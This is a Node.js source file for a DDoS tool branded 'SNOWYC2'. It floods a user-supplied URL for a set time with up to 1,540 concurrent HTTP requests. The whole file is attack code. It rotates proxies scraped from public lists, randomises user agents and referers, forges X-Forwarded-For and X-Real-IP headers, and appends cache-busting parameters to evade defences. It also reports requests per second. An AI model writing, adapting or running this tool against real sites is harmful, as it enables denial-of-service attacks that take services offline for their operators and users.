const axios = require('axios');
const fs = require('fs');
const os = require('os');
const http = require('http');
const https = require('https');
const process = require('process');

const MAX_CONCURRENT = Math.min(os.cpus().length * 154, 1540);
const REQUEST_TIMEOUT = 8000;

const REFERERS = loadLines('refs.txt');
const USER_AGENTS = loadLines('ua.txt');
const FILE_PROXIES = loadLines('proxies.txt').concat(loadLines('proxy2.txt'));

const UA_POOL = Array.from({ length: 10000 }, () =>
    USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)] || 'Mozilla/5.0'
);

const keepAliveHttp = new http.Agent({ keepAlive: true });
const keepAliveHttps = new https.Agent({ keepAlive: true });

function loadLines(filename) {
    try {
        return fs.readFileSync(filename, 'utf8')
            .split('\n')
            .map(line => line.trim())
            .filter(line => line.length > 0);
    } catch {
        return [];
    }
}

async function fetchProxies() {
    const urls = [
        'https://sts-proxies.vercel.app/v2/',
        'https://www.proxy-list.download/api/v1/get?type=http',
        'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all'
    ];

    let proxies = [...FILE_PROXIES];
    const promises = urls.map(async (url) => {
        try {
            const res = await axios.get(url);
            let data = res.data;
            if (data.proxies) data = data.proxies;
            if (typeof data === 'string') {
                proxies = proxies.concat(data.split('\n').map(p => p.trim()).filter(p => p.includes(':')));
            }
        } catch {
            // don’t block, just skip
        }
    });

    setTimeout(() => {}, 5000); // Let them load but don't block

    Promise.all(promises); // Load silently in background

    return [...new Set(proxies)];
}

class AttackEngine {
    constructor(target, duration) {
        this.target = target;
        this.duration = duration * 1000;
        this.startTime = Date.now();
        this.stats = {
            total: 0,
            success: 0,
            errors: 0,
            peakRps: 0
        };
        this.uaIndex = 0;
        this.running = true;
        this.allProxies = [];
        this.goodProxies = new Set();
    }

    async loadProxies() {
        this.allProxies = await fetchProxies();
    }

    getRandomProxy() {
        if (this.goodProxies.size && Math.random() < 0.8) {
            // Prioritize good proxies
            const list = Array.from(this.goodProxies);
            return list[Math.floor(Math.random() * list.length)];
        } else {
            return this.allProxies[Math.floor(Math.random() * this.allProxies.length)];
        }
    }

    getRandomUA() {
        this.uaIndex = (this.uaIndex + 1) % UA_POOL.length;
        return UA_POOL[this.uaIndex];
    }

    getRandomReferer() {
        return REFERERS[Math.floor(Math.random() * REFERERS.length)] || 'https://google.com';
    }

    async makeRequest() {
        const useProxy = Math.random() < 0.7;
        const randomIP = Array(4).fill(0).map(() => Math.floor(Math.random() * 255) + 1).join('.');
        const headers = {
            'User-Agent': this.getRandomUA(),
            'Referer': this.getRandomReferer(),
            'X-Forwarded-For': randomIP,
            'X-Real-IP': randomIP,
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        };

        const urlWithNoise = this.target + (this.target.includes('?') ? '&' : '?') + `cb=${Math.random().toString(36).substring(2, 15)}`;

        const config = {
            headers,
            timeout: REQUEST_TIMEOUT,
            httpAgent: keepAliveHttp,
            httpsAgent: keepAliveHttps,
            validateStatus: null
        };

        if (useProxy) {
            const proxy = this.getRandomProxy();
            if (proxy && proxy.includes(':')) {
                const [host, port] = proxy.split(':');
                config.proxy = { host, port: parseInt(port) };
            }
        }

        try {
            const res = await axios.get(urlWithNoise, config);
            if (res.status === 200) {
                this.stats.success++;
                if (useProxy && config.proxy) {
                    this.goodProxies.add(`${config.proxy.host}:${config.proxy.port}`);
                }
                return;
            }
        } catch {
            // ignore
        }

        this.stats.errors++;
    }

    async startWorkers() {
        const workers = [];
        for (let i = 0; i < MAX_CONCURRENT; i++) {
            workers.push(this.workerLoop());
        }
        await Promise.all(workers);
    }

    async workerLoop() {
        while (this.running && Date.now() - this.startTime < this.duration) {
            this.stats.total++;
            await this.makeRequest();
        }
    }

    async runAttack() {
        this.showIntro();
        await this.loadProxies();

        let lastTotal = 0;
        const printStats = setInterval(() => {
            const elapsed = (Date.now() - this.startTime) / 1000;
            const currentRps = (this.stats.total - lastTotal) / 0.2;
            lastTotal = this.stats.total;
            this.stats.peakRps = Math.max(this.stats.peakRps, currentRps);

            process.stdout.write(
                `\r  SENT: ${this.stats.total} | 200 OK: ${this.stats.success} | ERR: ${this.stats.errors} | RPS: ${currentRps.toFixed(1)} `
            );
        }, 200);

        await this.startWorkers();
        this.running = false;
        clearInterval(printStats);
        this.printSummary();
    }

    showIntro() {
        console.clear();
        console.log('\n  SNOWYC2 - T.ME/STSVKINGDOM');
        console.log('  ============================================');
        console.log(`  TARGET: ${this.target}`);
        console.log(`  TIME:   ${this.duration / 1000}s`);
        console.log(`  MODE:   RAPID STRIKE - ${MAX_CONCURRENT} Concurrent`);
        console.log('  ============================================\n');
    }

    printSummary() {
        const elapsed = (Date.now() - this.startTime) / 1000;
        const avgRps = this.stats.total / elapsed;
        console.log('\n\n  ATTACK FINISHED');
        console.log('  ============================================');
        console.log(`  TIME:        ${elapsed.toFixed(1)}s`);
        console.log(`  TOTAL:       ${this.stats.total}`);
        console.log(`  SUCCESS:     ${this.stats.success}`);
        console.log(`  ERRORS:      ${this.stats.errors}`);
        console.log(`  AVG RPS:     ${avgRps.toFixed(1)}`);
        console.log(`  PEAK RPS:    ${this.stats.peakRps.toFixed(1)}`);
        console.log('  ============================================\n');
    }
}

// Main
(async () => {
    const readline = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });

    const ask = (q) => new Promise(resolve => readline.question(q, resolve));

    const targetInput = await ask("TARGET: ");
    let target = targetInput.trim();
    if (!target.startsWith("http")) {
        target = "http://" + target;
    }

    const durationInput = await ask("TIME: ");
    readline.close();

    const duration = parseInt(durationInput);
    if (isNaN(duration)) {
        console.log("Invalid time input.");
        return;
    }

    const engine = new AttackEngine(target, duration);
    try {
        await engine.runAttack();
    } catch (err) {
        console.error("Attack failed:", err.message);
    }
})();
